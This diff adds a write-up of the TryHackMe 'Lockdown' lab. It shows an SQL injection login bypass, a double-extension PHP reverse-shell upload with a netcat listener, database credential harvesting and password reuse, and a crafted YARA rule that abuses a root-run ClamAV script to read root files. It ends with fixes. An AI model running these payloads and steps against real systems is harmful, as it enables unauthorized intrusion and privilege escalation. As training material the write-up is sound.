@@ -1,0 +1,176 @@
+---
+title: 'Lockdown'
+description: 'A contact-tracing web app falls to admin login SQL injection and a disguised PHP upload, then a hardcoded MySQL password and a YARA-scanning sudo script finish the job as root.'
+date: 2025-12-03
+platform: tryhackme
+room: 'Lockdown'
+roomUrl: 'https://tryhackme.com/room/lockdown'
+difficulty: medium
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'file-upload'
+  - 'mysql'
+  - 'password-cracking'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'authentication bypass'
+  - 'unrestricted file upload'
+  - 'cleartext database credentials'
+  - 'password reuse'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Lockdown — Admin Login SQL Injection, a Disguised PHP Upload, and a YARA-Scanning Sudo Script to Root**
+
+_A walkthrough of the "Lockdown" TryHackMe room. A contact-tracing web app's admin login falls to a one-line SQL injection, a double-extension trick smuggles a PHP reverse shell past an image upload filter, a hardcoded MySQL password leaks a second credential, and a sudo-able antivirus scan script gets abused with a self-authored YARA rule to read the root flag._
+
+> The flags and credentials are redacted. Lockdown is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` are real on the box but withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+The admin login of a Coronavirus Contact Tracer app is vulnerable to **SQL injection authentication bypass** → the admin panel's logo-upload field accepts a **PHP file disguised with a double** **`.png.php`** **extension** → PHP reverse shell as `www-data` → a **hardcoded MySQL password** in the app's own source unlocks the database → the admin's password hash is cracked and **reused** by a human user, `cyrus` → `cyrus` can run a ClamAV-based scan script as root, which resolves "viruses" using **YARA rules from a world-writable database directory** → writing a YARA rule that matches on the string `THM` lets the scan script quarantine (and hand us) the root flag.
+
+Auth-bypass SQLi → disguised file upload → RCE → hardcoded DB password → cracked + reused hash → YARA rule abuse of a root-run scanner → root.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+```
+
+Lockdown serves a "Coronavirus Contact Tracer" PHP app on port 80 alongside SSH on 22.
+
+### **The vulnerability: the admin login builds its query from raw input**
+
+```text
+gobuster dir -u http://$IP/ -w directory-list-2.3-medium.txt
+# /admin /uploads /plugins /classes ...
+```
+
+<Callout type="insight">
+
+The admin login at `/admin/login.php` reflects the exact SQL query the server ran when a login attempt fails — a strong hint the query is built by string concatenation rather than parameterized.
+
+</Callout>
+
+### **Step 1 — SQL injection bypasses the admin login**
+
+```text
+username: ' Or 1=1 -- -
+password: anything
+```
+
+This logs us in as the application's administrator with no valid credentials at all.
+
+### **Step 2 — a double extension smuggles a PHP shell past the upload filter**
+
+The admin panel includes a logo-upload feature that only checks the file's apparent extension. Renaming a PHP reverse shell to end in `.png` first, then re-appending `.php`, produces a filename the filter accepts as an image but PHP still executes:
+
+```text
+mv shell.php shell.php.png
+mv shell.php.png shell.png.php
+```
+
+Uploading `shell.png.php` as the site logo and requesting the page that renders it triggers the shell:
+
+```text
+nc -lvnp 4444
+# connect from $IP → uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### **Step 3 — a hardcoded MySQL password hands over the database**
+
+```text
+cat /var/www/html/classes/DBConnection.php
+# private $username = 'cts'; private $password = '<redacted>';
+mysql -u cts -p
+# use cts_db; select * from users;
+# admin | <redacted-hash>
+```
+
+### **Step 4 — cracking and reusing the admin's password**
+
+```text
+# Search That Hash / crackstation / john identify + crack the hash
+# -> <redacted-password>
+su cyrus
+# password reuse: the admin's cracked password also works for the human account cyrus
+cat /home/cyrus/user.txt   # -> THM{<redacted>}
+```
+
+### **Step 5 — abusing a root-run ClamAV scan via a self-authored YARA rule**
+
+```text
+sudo -l
+# (root) /opt/scan/scan.sh
+cat /opt/scan/scan.sh
+# reads a path, then: clamscan "$TARGET" --copy=/home/cyrus/quarantine
+```
+
+<Callout type="insight">
+
+ClamAV loads its signature database, including custom YARA rules, from a directory the script's own config happily points us at. If that directory is writable by our user, we control what the "antivirus" scanner treats as a threat — and therefore what it copies out for us.
+
+</Callout>
+
+```text
+ls -la /var/lib/clamav   # world-writable
+cat > /var/lib/clamav/rule.yar <<'EOF'
+rule PWNED
+{
+  strings:
+    $a = "root"
+    $b = "THM"
+  condition:
+    $a or $b
+}
+EOF
+sudo /opt/scan/scan.sh
+# Enter path: /root/root.txt
+# YARA.CheckFileName.UNOFFICIAL FOUND -> copied to /home/cyrus/quarantine/root.txt
+cat /home/cyrus/quarantine/root.txt   # -> THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`). Unauthenticated SQLi to root, entirely through application-logic gaps that each look small in isolation:
+
+- **Admin authentication bypass via SQL injection** grants full application control to anyone.
+- **Extension-based upload filtering** is trivially defeated and leads directly to remote code execution.
+- **A hardcoded database password in source** and **password reuse between the application's admin and a system account** convert a web-app bug into an SSH foothold.
+- **A root-run "security scanner" that trusts a writable rule database** inverts its own purpose into an arbitrary-file-read primitive.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Parameterize the login query** and hash all stored passwords with bcrypt/argon2 — never roll a custom scheme.
+2. **Validate uploads by content (magic bytes / real image decoding), not filename extension**, and store uploads outside the webroot or disable script execution in the upload directory.
+3. **Never hardcode database credentials**; use environment variables or a secrets manager, and rotate any credential this exercise exposed.
+4. **Lock down the ClamAV signature/rule directory to root-only write access**, and audit any `sudo` rule that lets a non-admin trigger a privileged scan of an arbitrary path.
+
+</Callout>
+
+### **Takeaways**
+
+- **Error messages that echo the query are a free SQLi oracle.** Generic error pages aren't optional.
+- **File-type filtering by extension is not a security control.** Always validate by content.
+- **Password reuse between an application account and a system account bridges two "separate" attack surfaces** into one.
+- **A privileged helper script is only as trustworthy as every file it reads** — including its own signature database.
+
+Thanks for reading. Lockdown is a tidy demonstration of how several individually-small bugs — none of them exotic — stack into full root compromise when nobody re-checks the trust boundary between them.
